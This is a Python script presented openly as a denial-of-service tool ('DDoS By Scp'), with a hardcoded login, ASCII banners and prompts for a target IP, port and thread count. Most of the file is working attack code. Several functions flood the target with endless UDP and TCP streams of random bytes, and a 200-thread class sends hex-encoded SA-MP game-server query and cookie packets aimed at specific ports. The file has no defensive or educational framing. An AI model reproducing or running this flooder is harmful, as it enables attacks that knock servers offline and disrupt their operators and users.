import random
import socket
import threading
import platform
import codecs
import struct
import time
import socket
import sys
import os

###### Scp #####
os.system("clear")
os.system("None")
print("\033[32m DDoS By Scp Is Loding ")
time.sleep(2)
print("Loading...")
os.system("clear")

#### Login       

attemps = 0

while attemps < 100:
    username = input('\033[33m Username : ')
    password = input('\033[33m Password : ')
    if username == 'Scp' and password == 'Scp':
        print('Welcome Scp!!')
        break
    else:
        print('\033[31m Invalid username and password ')
        attemps += 1
        continue
os.system("clear")

print("DDoS is Running in : "+platform.system())

if platform.system() == 'Windows':

	print("""
 DDos By Scp is Presenting to you :




████████╗███████╗░█████╗░███╗░░░███╗  ░█████╗░░█████╗░░█████╗░
╚══██╔══╝██╔════╝██╔══██╗████╗░████║  ██╔══██╗██╔══██╗██╔══██╗
░░░██║░░░█████╗░░███████║██╔████╔██║  ╚██████║╚██████║╚██████║
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║  ░╚═══██║░╚═══██║░╚═══██║
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║  ░█████╔╝░█████╔╝░█████╔╝
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░  """)
else :
	print("""
	'\033[4;34m'
 TEAM 999 is Presenting to you :


██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

█▀▀ █▀▀ █▀▀█
▀▀█ █░░ █░░█
▀▀▀ ▀▀▀ █▀▀▀

░█████╗░██╗░░██╗██╗██╗░░██╗░█████╗░██████╗░██╗
██╔══██╗██║░░██║██║██║░██╔╝██╔══██╗██╔══██╗██║
██║░░╚═╝███████║██║█████═╝░██║░░██║██████╔╝██║
██║░░██╗██╔══██║██║██╔═██╗░██║░░██║██╔══██╗██║
╚█████╔╝██║░░██║██║██║░╚██╗╚█████╔╝██║░░██║██║
░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝

	DDoS : By Scp
				""")
print("DDos")			
ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input("Thb Tnik  Serveur? (y/n):"))
times = int(input(" Packet:"))
threads = int(input(" Threads:"))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def run():
	data = random._urandom(1460)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Send Attacking By Scp !!!")
		except:
			print("[!]Scp YNIK KOLL!!")

def run2():
	data = random._urandom(1204)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Send Attacking By Scp !!!")
		except:
			s.close()
			print("[*]Send Attacking By Scp !!!")
            

def run3():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Send Attacking By Scp !!!")
		except:
			s.close()
			print("[*]Send Attacking By Scp !!!")
            
  
def run4():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Send Attacking By Scp !!!")
		except:
			s.close()
			print("[*]Send Attacking By Scp !!!")
			
def run5():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Send Attacking By Scp !!!")
		except:
			s.close()
			print("[*]Send Attacking By Scp !!!")
            
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()